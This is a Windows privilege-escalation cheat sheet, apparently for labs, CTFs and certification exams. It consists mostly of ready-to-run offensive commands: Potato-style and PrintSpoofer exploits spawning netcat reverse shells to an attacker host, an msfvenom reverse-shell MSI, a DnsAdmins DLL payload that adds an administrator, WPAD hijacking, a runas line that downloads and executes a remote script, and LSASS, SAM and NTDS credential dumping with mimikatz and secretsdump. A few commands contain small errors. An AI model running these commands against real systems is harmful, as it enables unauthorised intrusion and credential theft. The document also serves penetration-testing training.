# Windows Privilege Escalation Cheat Sheet

> Use only in authorised labs, CTFs, exams, or environments where you have explicit permission to test.
> Replace placeholder values such as `<TARGET_IP>`, `<USERNAME>`, `<PASSWORD>`, `<ATTACKER_IP>`, and `<PORT>` before running commands.

---

## Table of Contents

1. [Initial Enumeration](#1-initial-enumeration)
2. [User, Group, and Privilege Enumeration](#2-user-group-and-privilege-enumeration)
3. [Network Enumeration](#3-network-enumeration)
4. [Defender, AppLocker, and Policy Checks](#4-defender-applocker-and-policy-checks)
5. [Processes, Services, and Named Pipes](#5-processes-services-and-named-pipes)
6. [MSSQL Post-Exploitation](#6-mssql-post-exploitation)
7. [Token Impersonation and Potato-Style Attacks](#7-token-impersonation-and-potato-style-attacks)
8. [File Ownership and ACL Abuse](#8-file-ownership-and-acl-abuse)
9. [Credential Hunting](#9-credential-hunting)
10. [LSASS, NTDS, and Hash Extraction](#10-lsass-ntds-and-hash-extraction)
11. [Event Log Hunting](#11-event-log-hunting)
12. [DNS Admin and ServerLevelPluginDll Abuse](#12-dns-admin-and-serverlevelplugindll-abuse)
13. [Driver Loading and SeLoadDriverPrivilege](#13-driver-loading-and-seloaddriverprivilege)
14. [Service Misconfiguration Abuse](#14-service-misconfiguration-abuse)
15. [UAC and PATH Checks](#15-uac-and-path-checks)
16. [Startup Programs and Scheduled Tasks](#16-startup-programs-and-scheduled-tasks)
17. [AlwaysInstallElevated](#17-alwaysinstallelevated)
18. [File Transfer](#18-file-transfer)
19. [VHD, VHDX, and VMDK Mounting](#19-vhd-vhdx-and-vmdk-mounting)
20. [Windows Exploit Suggester](#20-windows-exploit-suggester)
21. [Placeholder Reference](#21-placeholder-reference)
22. [Quick Workflow](#22-quick-reference)
23. [Restricted Environments](#23-restricted-environments)
24. [Windows Memory & Crash Dump Analysis](#24-windows-memory-&-crash-dump-analysis)

---

# 1. Initial Enumeration

Initial enumeration is about understanding the host, current user context, OS version, installed software, network position, and available security controls.

## RDP Access

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME>
```

RDP to the target host using a known username.

With password:

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

With clipboard and dynamic resolution:

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /clipboard /dynamic-resolution
```

---

## System and Host Information

```cmd
systeminfo
```

Displays OS version, hostname, domain/workgroup, hotfixes, architecture, and boot time.

```cmd
hostname
```

Shows the computer name.

```cmd
echo %USERNAME%
```

Shows the current username.

```cmd
whoami
```

Shows the current user context.

```powershell
[environment]::OSVersion.Version
```

Shows the Windows version from PowerShell.

```cmd
wmic qfe
```

Lists installed patches and updates.

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Cleaner hotfix output.

```cmd
wmic product get name
```

Lists installed software. This can be slow and noisy.

```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
```

PowerShell alternative for installed programs.

---

# 2. User, Group, and Privilege Enumeration

Privilege escalation often depends on group membership, local privileges, weak permissions, or reusable credentials.

## Current User

```cmd
whoami
```

```cmd
echo %USERNAME%
```

```cmd
whoami /user
```

Shows the current user SID.

---

## User Privileges

```cmd
whoami /priv
```

Look for interesting privileges such as:

| Privilege                       | Why It Matters                                                                        |
| ------------------------------- | ------------------------------------------------------------------------------------- |
| `SeImpersonatePrivilege`        | May allow token impersonation attacks such as PrintSpoofer or JuicyPotato-style abuse |
| `SeAssignPrimaryTokenPrivilege` | Can be useful for token abuse                                                         |
| `SeBackupPrivilege`             | May allow reading protected files such as `SAM`, `SYSTEM`, or `NTDS.dit`              |
| `SeRestorePrivilege`            | May allow overwriting protected files                                                 |
| `SeDebugPrivilege`              | Can allow access to sensitive processes such as LSASS                                 |
| `SeLoadDriverPrivilege`         | May allow loading vulnerable drivers                                                  |
| `SeTakeOwnershipPrivilege`      | Can allow taking ownership of files or services                                       |
| `SeManageVolumePrivilege`       | Can sometimes be abused for file system access                                        |

---

## Group Membership

```cmd
whoami /groups
```

Look for memberships such as:

| Group                     | Why It Matters                                       |
| ------------------------- | ---------------------------------------------------- |
| `Administrators`          | Local administrator rights                           |
| `Remote Management Users` | WinRM access may be possible                         |
| `Remote Desktop Users`    | RDP access may be possible                           |
| `Backup Operators`        | May allow backup-style file access                   |
| `DnsAdmins`               | Potential DLL loading abuse on DNS servers           |
| `Event Log Readers`       | May allow sensitive log review                       |
| `Server Operators`        | May allow service modification on domain controllers |
| `Account Operators`       | May allow user/group management                      |
| `Print Operators`         | Sometimes useful on domain controllers               |
| `Hyper-V Administrators`  | Can be dangerous if virtualisation abuse is possible |

---

## Local Users and Groups

```cmd
net user
```

Lists local users.

```cmd
net user <USERNAME>
```

Shows details for a specific user.

```cmd
net localgroup
```

Lists local groups.

```cmd
net localgroup administrators
```

Lists local administrators.

```cmd
net localgroup "Remote Management Users"
```

Checks WinRM-capable users.

```cmd
net localgroup "Remote Desktop Users"
```

Checks RDP-capable users.

```powershell
Get-LocalUser
```

Lists local users with PowerShell.

```powershell
Get-LocalGroup
```

Lists local groups with PowerShell.

```powershell
Get-LocalGroupMember Administrators
```

Lists local administrators.

---

## Password Policy

```cmd
net accounts
```

Shows password policy, lockout policy, and password age settings.

Useful things to note:

* Minimum password length
* Lockout threshold
* Lockout duration
* Password history length
* Maximum password age

---

# 3. Network Enumeration

Network enumeration helps identify pivot routes, active connections, neighbouring hosts, DNS configuration, and reachable services.

## Interface and DNS Information

```cmd
ipconfig /all
```

Shows IP addresses, DNS servers, gateways, DHCP information, and interface details.

---

## ARP Table

```cmd
arp -a
```

Shows recently contacted hosts on the local network.

---

## Routing Table

```cmd
route print
```

Shows routes available from the compromised host.

Look for:

* Additional internal networks
* VPN routes
* Non-standard gateways
* Routes to domain controllers or management networks

---

## Active Connections

```cmd
netstat -ano
```

Shows listening ports and active connections with process IDs.

```cmd
netstat -ano | findstr LISTENING
```

Shows listening ports only.

```powershell
Get-NetTCPConnection
```

PowerShell alternative.

```powershell
Get-NetTCPConnection | Where-Object State -eq Listen
```

Shows listening TCP ports.

---

# 4. Defender, AppLocker, and Policy Checks

Security controls affect what binaries, scripts, and payloads can run.

## Windows Defender Status

```powershell
Get-MpComputerStatus
```

Useful fields:

| Field                       | Meaning                               |
| --------------------------- | ------------------------------------- |
| `RealTimeProtectionEnabled` | Whether real-time scanning is enabled |
| `AntivirusEnabled`          | Whether Defender AV is enabled        |
| `AMServiceEnabled`          | Whether Defender service is enabled   |
| `BehaviorMonitorEnabled`    | Behaviour monitoring status           |
| `IoavProtectionEnabled`     | Download/file scanning status         |

---

## AppLocker Rules

```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

Lists effective AppLocker rules.

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
```

Tests whether a path is allowed for a user or group.

Additional tests:

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -User Everyone
```

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Users\<USERNAME>\Downloads\tool.exe -User Everyone
```

Common writable paths to check:

```text
C:\Windows\Tasks
C:\Windows\Temp
C:\Users\<USERNAME>\AppData\Local\Temp
C:\Users\<USERNAME>\Downloads
```

---

## Environment Variables

```cmd
set
```

Displays all environment variables.

```cmd
cmd /c echo %PATH%
```

Shows the current PATH.

```powershell
$env:PATH
```

PowerShell equivalent.

Things to look for:

* Writable directories in `PATH`
* Custom application paths
* Script directories
* Developer tooling paths
* Misconfigured service locations

---

# 5. Processes, Services, and Named Pipes

Processes and services can reveal running applications, security products, service accounts, and privilege escalation paths.

## Running Processes

```cmd
tasklist /svc
```

Shows running processes and associated services.

```powershell
Get-Process
```

PowerShell process listing.

```powershell
Get-Process -Id <PID>
```

Gets details for a specific process ID.

```cmd
wmic process get ProcessId,ParentProcessId,ExecutablePath,CommandLine
```

Shows process paths and command lines.

---

## Logged-In Users

```cmd
query user
```

Shows logged-in users and sessions.

```cmd
qwinsta
```

Shows session information.

---

## Services

```cmd
sc query
```

Lists services.

```cmd
sc query <SERVICE_NAME>
```

Checks a specific service.

```powershell
Get-Service
```

Lists services with PowerShell.

```powershell
Get-Service | Where-Object {$_.DisplayName -like '*<KEYWORD>*'}
```

Searches services by display name.

```cmd
wmic service get name,displayname,pathname,startmode
```

Lists services, paths, and startup modes.

---

## Named Pipes

Named pipes can expose privileged inter-process communication channels.

```cmd
pipelist.exe /accepteula
```

Lists named pipes using Sysinternals Pipelist.

```powershell
gci \\.\pipe\
```

Lists named pipes with PowerShell.

```cmd
accesschk.exe /accepteula \\.\Pipe\<PIPE_NAME> -v
```

Checks permissions on a named pipe.

Example:

```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

---

# 6. MSSQL Post-Exploitation

MSSQL access can lead to OS command execution if permissions allow `xp_cmdshell`.

## Connect with Impacket

```bash
mssqlclient.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -windows-auth
```

Local account example:

```bash
mssqlclient.py <USERNAME>:<PASSWORD>@<TARGET_IP>
```

Windows authentication example:

```bash
mssqlclient.py <USERNAME>@<TARGET_IP> -windows-auth
```

---

## Enable xp_cmdshell

Inside `mssqlclient.py`:

```sql
enable_xp_cmdshell
```

Manual SQL method:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

---

## Run OS Commands

```sql
xp_cmdshell whoami
```

```sql
xp_cmdshell ipconfig
```

```sql
xp_cmdshell "whoami /priv"
```

Useful checks:

```sql
xp_cmdshell "hostname && whoami && whoami /priv"
```

---

# 7. Token Impersonation and Potato-Style Attacks

These attacks usually require privileges such as `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

## Check for Required Privileges

```cmd
whoami /priv
```

Look for:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

---

## JuicyPotato Example

```cmd
C:\Tools\JuicyPotato.exe -l <LOCAL_PORT> -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\nc.exe <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe" -t *
```

Start a listener first:

```bash
nc -lvnp <ATTACKER_PORT>
```

Notes:

* JuicyPotato is mainly relevant to older Windows versions.
* Newer systems may require alternatives.
* Check OS version before attempting.

---

## PrintSpoofer Example

```cmd
C:\Tools\PrintSpoofer.exe -c "C:\Tools\nc.exe <ATTACKER_IP> <ATTACKER_PORT> -e cmd"
```

Start listener:

```bash
nc -lvnp <ATTACKER_PORT>
```

Notes:

* Often useful when the current context has `SeImpersonatePrivilege`.
* Common in service account contexts such as IIS, SQL Server, or custom services.

---

# 8. File Ownership and ACL Abuse

Weak file permissions can allow replacing configs, binaries, scripts, or service executables.

## Check File Ownership

```cmd
dir /q C:\Path\To\File.ext
```

---

## Take Ownership

```cmd
takeown /f C:\Path\To\File.ext
```

For a directory recursively:

```cmd
takeown /f C:\Path\To\Directory /r /d y
```

---

## Confirm Ownership with PowerShell

```powershell
Get-ChildItem -Path "C:\Path\To\File.ext" |
Select-Object Name, Directory, @{Name="Owner";Expression={(Get-ACL $_.FullName).Owner}}
```

---

## Modify File ACL

```cmd
icacls "C:\Path\To\File.ext" /grant <USERNAME>:F
```

Grant full control recursively:

```cmd
icacls "C:\Path\To\Directory" /grant <USERNAME>:F /T
```

Check permissions:

```cmd
icacls "C:\Path\To\File.ext"
```

---

# 9. Credential Hunting

Credential hunting looks for plaintext passwords, saved credentials, browser secrets, history files, and config files.

## Search for Password Strings

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

```cmd
findstr /si password *.xml *.ini *.txt *.config
```

```cmd
findstr /spin "password" *.*
```

From a specific directory:

```cmd
cd C:\Users\<USERNAME>\Documents
findstr /SI /M "password" *.xml *.ini *.txt
```

---

## PowerShell Content Search

```powershell
Select-String -Path C:\Users\<USERNAME>\Documents\*.txt -Pattern password
```

Recursive search:

```powershell
Get-ChildItem C:\Users\<USERNAME>\Documents -Recurse -File -ErrorAction SilentlyContinue |
Select-String -Pattern "password"
```

Search for multiple keywords:

```powershell
Get-ChildItem C:\Users\<USERNAME> -Recurse -File -ErrorAction SilentlyContinue |
Select-String -Pattern "password","passwd","pwd","secret","token","key"
```

---

## Search for Interesting File Extensions

```cmd
dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config*
```

```cmd
where /R C:\ *.config
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore
```

Additional useful extensions:

```powershell
Get-ChildItem C:\Users -Recurse -Include *.kdbx,*.txt,*.ini,*.xml,*.config,*.json,*.yml,*.ps1,*.bat,*.cmd -ErrorAction SilentlyContinue
```

---

## PowerShell History

```powershell
(Get-PSReadLineOption).HistorySavePath
```

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

Search history for secrets:

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath |
Select-String -Pattern "password","pass","cred","token","key","secret"
```

---

## PowerShell CLIXML Credentials

```powershell
$credential = Import-Clixml -Path "C:\Path\To\Credential.xml"
```

View username:

```powershell
$credential.UserName
```

Use credential object:

```powershell
Start-Process powershell.exe -Credential $credential
```

Note:

* CLIXML credentials are usually decryptable only by the same user on the same machine where they were exported.

---

## Chrome Custom Dictionary

```powershell
Get-Content "C:\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" |
Select-String password
```

Users sometimes accidentally add passwords to browser dictionaries.

---

## Saved Windows Credentials

```cmd
cmdkey /list
```

If credentials are saved, they may be usable with tools such as:

```cmd
runas /savecred /user:<DOMAIN>\<USERNAME> cmd.exe
```
```cmd
runas /savedcred /user:ACCESS\Administrator "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.239:8000/admin.ps1')"
```

Check if shortcut exists:
```bash
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas }
```
---

## Browser Credential Tools

```cmd
SharpChrome.exe logins /unprotect
```

Retrieves saved Chrome credentials where accessible.

---

## LaZagne

```cmd
lazagne.exe -h
```

Shows help menu.

```cmd
lazagne.exe all
```

Runs all LaZagne modules.

Useful targeted modules:

```cmd
lazagne.exe browsers
```

```cmd
lazagne.exe windows
```

---

## SessionGopher

```powershell
Invoke-SessionGopher -Target <TARGET_HOST>
```

Searches for saved session information from tools such as PuTTY, WinSCP, FileZilla, and RDP clients.

---

## Wireless Credentials

```cmd
netsh wlan show profile
```

Lists saved wireless profiles.

```cmd
netsh wlan show profile <WIFI_PROFILE> key=clear
```

Retrieves saved wireless key material where permitted.

---

# 10. LSASS, NTDS, and Hash Extraction

These techniques involve sensitive credential material. Use only in authorised labs or approved engagements.

## Locations
|File|Location|
|--|--|
|ntds.dit|C:\Windows\NTDS\ntds.dit|
|SYSTEM|C:\Windows\System32\config\SYSTEM|
|SAM|C:\Windows\System32\config\SAM|
|SECURITY|C:\Windows\System32\config\SECURITY|


## Dump LSASS with ProcDump

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Alternative using process ID:

```cmd
tasklist | findstr lsass
procdump.exe -accepteula -ma <LSASS_PID> lsass.dmp
```

---

## Analyse LSASS Dump with Mimikatz

Inside Mimikatz:

```text
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## Copy NTDS.dit with RoboCopy

```cmd
robocopy /B C:\Windows\NTDS .\ntds ntds.dit
```

Notes:

* `/B` uses backup mode.
* Often requires `SeBackupPrivilege` or administrator-level access.

---

## Extract Hashes with secretsdump.py

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

With hashes:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes <LM_HASH>:<NT_HASH> LOCAL
```

Remote example:

```bash
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
```

Pass-the-hash example:

```bash
secretsdump.py -hashes <LM_HASH>:<NT_HASH> <DOMAIN>/<USERNAME>@<TARGET_IP>
```

---

# 11. Event Log Hunting

Event logs can expose command lines, credentials passed to tools, service actions, and lateral movement evidence.

## Search Security Logs with wevtutil

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Remote query with credentials:

```cmd
wevtutil qe Security /rd:true /f:text /r:<REMOTE_HOST> /u:<DOMAIN>\<USERNAME> /p:<PASSWORD> | findstr "/user"
```

---

## Search Process Creation Events

Event ID `4688` records process creation if command-line auditing is enabled.

```powershell
Get-WinEvent -LogName Security |
Where-Object {
    $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'
} |
Select-Object @{Name='CommandLine';Expression={$_.Properties[8].Value}}
```

Search for passwords:

```powershell
Get-WinEvent -LogName Security |
Where-Object {
    $_.ID -eq 4688 -and $_.Properties[8].Value -match 'pass|password|pwd|cred'
} |
Select-Object TimeCreated,@{Name='CommandLine';Expression={$_.Properties[8].Value}}
```

---

# 12. DNS Admin and ServerLevelPluginDll Abuse

The `DnsAdmins` group can sometimes be abused to load a DLL into the DNS service. This is typically relevant on Windows DNS servers.

## Generate DLL Payload

```bash
msfvenom -p windows/x64/exec CMD='<COMMAND_TO_RUN>' -f dll -o payload.dll
```

Example command payload:

```bash
msfvenom -p windows/x64/exec CMD='net localgroup Administrators <USERNAME> /add' -f dll -o payload.dll
```

---

## Configure DNS Server Plugin DLL

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Path\To\payload.dll
```

Remote UNC path example:

```cmd
dnscmd.exe /config /serverlevelplugindll \\<ATTACKER_IP>\share\payload.dll
```

---

## Check User SID

```cmd
wmic useraccount where name="<USERNAME>" get sid
```

---

## Check DNS Service Permissions

```cmd
sc.exe sdshow DNS
```

---

## Restart DNS Service

```cmd
sc stop dns
```

```cmd
sc start dns
```

Check status:

```cmd
sc query dns
```

---

## Query DNS Registry Key

```cmd
reg query \\<TARGET_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

---

## Delete ServerLevelPluginDll Registry Value

```cmd
reg delete \\<TARGET_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

---

## WPAD Record Abuse

Disable global query block list:

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <DNS_SERVER>
```

Add WPAD record:

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName <DOMAIN> -ComputerName <DNS_SERVER> -IPv4Address <ATTACKER_IP>
```

---

# 13. Driver Loading and SeLoadDriverPrivilege

`SeLoadDriverPrivilege` may allow loading a vulnerable driver, which can then be abused for privilege escalation.

## Check Privilege

```cmd
whoami /priv
```

Look for:

```text
SeLoadDriverPrivilege
```

---

## Compile Helper

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

---

## Add Driver Registry Reference

```cmd
reg add HKCU\System\CurrentControlSet\<DRIVER_NAME> /v ImagePath /t REG_SZ /d "\??\C:\Tools\<DRIVER_FILE>.sys"
```

```cmd
reg add HKCU\System\CurrentControlSet\<DRIVER_NAME> /v Type /t REG_DWORD /d 1
```

---

## Load Driver

```cmd
EoPLoadDriver.exe System\CurrentControlSet\<DRIVER_NAME> C:\Tools\<DRIVER_FILE>.sys
```

---

## Check Loaded Drivers

```cmd
DriverView.exe /stext drivers.txt
```

```powershell
Get-Content drivers.txt | Select-String -Pattern <DRIVER_NAME>
```

---

# 14. Service Misconfiguration Abuse

Windows services are a common privilege escalation path when permissions or paths are misconfigured.

## Check Service Permissions with PsService

```cmd
PsService.exe security <SERVICE_NAME>
```

Example:

```cmd
C:\Tools\PsService.exe security AppReadiness
```

---

## Check Service Permissions with AccessChk

```cmd
accesschk.exe /accepteula -uwcqv "<USERNAME>" *
```

For a specific service:

```cmd
accesschk.exe /accepteula -uwcqv "<USERNAME>" <SERVICE_NAME>
```

Registry service ACL check:

```cmd
accesschk.exe /accepteula "<USERNAME>" -kvuqsw HKLM\System\CurrentControlSet\Services
```

---

## Modify Service Binary Path

```cmd
sc config <SERVICE_NAME> binPath= "cmd /c net localgroup Administrators <USERNAME> /add"
```

Start or restart the service:

```cmd
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```

PowerShell alternative:

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE_NAME> -Name "ImagePath" -Value "C:\Path\To\Payload.exe"
```

---

## Check Service Binary Permissions

```cmd
icacls "C:\Path\To\ServiceBinary.exe"
```

---

## Replace Writable Service Binary

```cmd
copy /Y payload.exe "C:\Path\To\ServiceBinary.exe"
```

Then restart the service:

```cmd
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```

---

## Search for Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode |
findstr /i "auto" |
findstr /i /v "c:\windows\\" |
findstr /i /v """
```

Manual checks:

```cmd
sc qc <SERVICE_NAME>
```

Look for paths like:

```text
C:\Program Files\Some Service\Service.exe
```

If the path contains spaces and is not quoted, Windows may try to execute:

```text
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Service\Service.exe
```

---

## SharpUp Audit

```cmd
SharpUp.exe audit
```

SharpUp can identify common privilege escalation issues such as:

* Modifiable services
* Unquoted service paths
* Weak folder permissions
* AlwaysInstallElevated
* Token privileges
* AutoLogon credentials

---

# 15. UAC and PATH Checks

UAC configuration and PATH issues may influence escalation or bypass opportunities.

UAC Bypass Project: `https://github.com/hfiref0x/UACME`

## Check Whether UAC Is Enabled

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Interpretation:

| Value | Meaning      |
| ----- | ------------ |
| `0x0` | UAC disabled |
| `0x1` | UAC enabled  |

---

## Check UAC Prompt Behaviour

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

Common values:

| Value | Meaning                                     |
| ----- | ------------------------------------------- |
| `0`   | Elevate without prompting                   |
| `1`   | Prompt for credentials on secure desktop    |
| `2`   | Prompt for consent on secure desktop        |
| `5`   | Prompt for consent for non-Windows binaries |

---

## Review PATH

```cmd
cmd /c echo %PATH%
```

```powershell
$env:PATH
```

Check whether any PATH directories are writable:

```powershell
$env:PATH -split ';' | ForEach-Object {
    if ($_ -and (Test-Path $_)) {
        Get-Acl $_
    }
}
```

---

## DLL Execution with rundll32

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Path\To\payload.dll
```

Note:

* DLL search order hijacking depends on application behaviour and writable paths.
* Confirm the vulnerable binary and DLL load path before replacing or adding DLLs.

---

# 16. Startup Programs and Scheduled Tasks

Startup entries and scheduled tasks can run as privileged users if misconfigured.

## Startup Programs

```powershell
Get-CimInstance Win32_StartupCommand |
Select-Object Name, Command, Location, User |
Format-List
```

Look for:

* Writable script paths
* Writable executable paths
* Startup items running as privileged users
* Paths in writable directories

---

## Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

PowerShell:

```powershell
Get-ScheduledTask | Select-Object TaskName, State
```

Detailed task info:

```powershell
Get-ScheduledTask |
Where-Object {$_.TaskPath -notlike "\Microsoft*"} |
Select-Object TaskName, TaskPath, State
```

Inspect task actions:

```powershell
Get-ScheduledTask |
ForEach-Object {
    $_ | Select-Object TaskName, TaskPath, State
    $_.Actions
}
```

Check permissions on a task script directory:

```cmd
accesschk64.exe /accepteula -s -d C:\Path\To\Scripts\
```

---

# 17. AlwaysInstallElevated

AlwaysInstallElevated allows low-privileged users to install MSI packages with elevated privileges when both user and machine registry keys are enabled.

## Check Registry Keys

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Both must contain:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

---

## Generate MSI Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f msi > payload.msi
```

---

## Execute MSI

```cmd
msiexec /i C:\Path\To\payload.msi /quiet /qn /norestart
```

Start listener first:

```bash
nc -lvnp <ATTACKER_PORT>
```

---

# 18. File Transfer

File transfer is commonly needed for tools, payloads, logs, and loot.

## certutil Download

```cmd
certutil.exe -urlcache -split -f http://<ATTACKER_IP>:<PORT>/<FILE> <FILE>
```

---

## certutil Encode and Decode

Encode:

```cmd
certutil -encode file1 encodedfile
```

Decode:

```cmd
certutil -decode encodedfile file2
```

---

## PowerShell Download

```powershell
Invoke-WebRequest http://<ATTACKER_IP>:<PORT>/<FILE> -OutFile C:\Path\To\<FILE>
```

Short alias:

```powershell
iwr http://<ATTACKER_IP>:<PORT>/<FILE> -OutFile C:\Path\To\<FILE>
```

Using `curl.exe`:

```powershell
curl.exe http://<ATTACKER_IP>:<PORT>/<FILE> -o C:\Path\To\<FILE>
```

---

## Start Python Web Server on Attacker

```bash
python3 -m http.server <PORT>
```

---

## SMB Server from Attacker

```bash
impacket-smbserver share . -smb2support
```

Windows target can access:

```cmd
dir \\<ATTACKER_IP>\share
```

Copy file:

```cmd
copy \\<ATTACKER_IP>\share\<FILE> C:\Path\To\<FILE>
```

---

# 19. VHD, VHDX, and VMDK Mounting

Virtual disk files may contain sensitive files, database backups, registry hives, or credentials.

## Mount VMDK on Linux

```bash
guestmount -a <DISK_FILE>.vmdk -i --ro /mnt/vmd
```

---

## Mount VHD/VHDX on Linux

```bash
guestmount --add <DISK_FILE>.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

---

## Useful Searches After Mounting

```bash
find /mnt/vmd -iname "*password*" -o -iname "*cred*" -o -iname "*.config"
```

```bash
grep -Rni "password\|connectionString\|user id\|pwd" /mnt/vmd 2>/dev/null
```

---

# 20. Windows Exploit Suggester

Windows Exploit Suggester compares patch data against known local privilege escalation vulnerabilities.

## Save systeminfo Output on Target

```cmd
systeminfo > systeminfo.txt
```

Transfer `systeminfo.txt` to Kali.

---

## Update Database

```bash
sudo python2.7 windows-exploit-suggester.py --update
```

---

## Run Windows Exploit Suggester

```bash
python2.7 windows-exploit-suggester.py --database <DATABASE_FILE>.xls --systeminfo systeminfo.txt
```

Example:

```bash
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win-systeminfo.txt
```

---

# 21. Placeholder Reference

| Placeholder       | Meaning                                   |
| ----------------- | ----------------------------------------- |
| `<TARGET_IP>`     | Target machine IP address                 |
| `<TARGET_HOST>`   | Target hostname                           |
| `<USERNAME>`      | Username                                  |
| `<PASSWORD>`      | Password                                  |
| `<DOMAIN>`        | Windows domain                            |
| `<ATTACKER_IP>`   | Your VPN, tunnel, or attacking machine IP |
| `<ATTACKER_PORT>` | Listener port on your machine             |
| `<PORT>`          | Generic port                              |
| `<PID>`           | Process ID                                |
| `<SERVICE_NAME>`  | Windows service name                      |
| `<PIPE_NAME>`     | Named pipe                                |
| `<KEYWORD>`       | Search term                               |
| `<FILE>`          | File name                                 |
| `<PATH>`          | File or directory path                    |
| `<DRIVER_NAME>`   | Registry service name for driver          |
| `<DRIVER_FILE>`   | Driver `.sys` file                        |
| `<DNS_SERVER>`    | DNS server hostname or IP                 |
| `<WIFI_PROFILE>`  | Saved wireless profile name               |
| `<DATABASE_FILE>` | Windows Exploit Suggester database file   |

---

# 22. Quick Workflow

## Step 1: Identify Context

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
```

## Step 2: Check Network Position

```cmd
ipconfig /all
arp -a
route print
netstat -ano
```

## Step 3: Enumerate Users and Groups

```cmd
net user
net localgroup
net localgroup administrators
net accounts
```

## Step 4: Check Security Controls

```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

## Step 5: Look for Credentials

```cmd
cmdkey /list
findstr /si password *.xml *.ini *.txt *.config
```

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

## Step 6: Check Services

```cmd
wmic service get name,displayname,pathname,startmode
```

```cmd
accesschk.exe /accepteula -uwcqv "<USERNAME>" *
```

## Step 7: Check Common Escalation Paths

```cmd
whoami /priv
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
schtasks /query /fo LIST /v
```

## Step 8: Document Findings

Record:

```text
Current user:
Groups:
Privileges:
OS version:
Hostname:
Domain:
Interesting services:
Writable paths:
Saved credentials:
Defender status:
AppLocker rules:
Potential escalation path:
Commands run:
Evidence:
```

# 23. Restricted Environments

## 23.1 Citrix Breakout

### Overview

Restricted desktop environments are common in **Citrix**, **Terminal Services/RDS**, **AWS AppStream**, **CyberArk PSM**, and kiosk deployments. Organisations use policy restrictions to prevent users from launching administrative tools, browsing sensitive directories, or executing arbitrary programs.

A **Citrix breakout** occurs when a user escapes these application/desktop restrictions and gains access to functionality that the environment was intended to block. A successful breakout does **not** automatically mean administrative access: privilege escalation is a separate step.

**Typical assessment workflow:**

1. Identify an accessible application or Windows **file dialog**.
2. Use the dialog or another permitted interaction to reach restricted paths or launch a process.
3. Obtain a command prompt or more capable file manager.
4. Enumerate the host and check for local privilege-escalation weaknesses.
5. Validate the effective privilege level after any elevation.

> **Key concept:** A restriction enforced by the normal Windows Explorer interface may not be enforced by another application, a file dialog, or an alternative file manager. Conversely, actual filesystem permissions still apply.

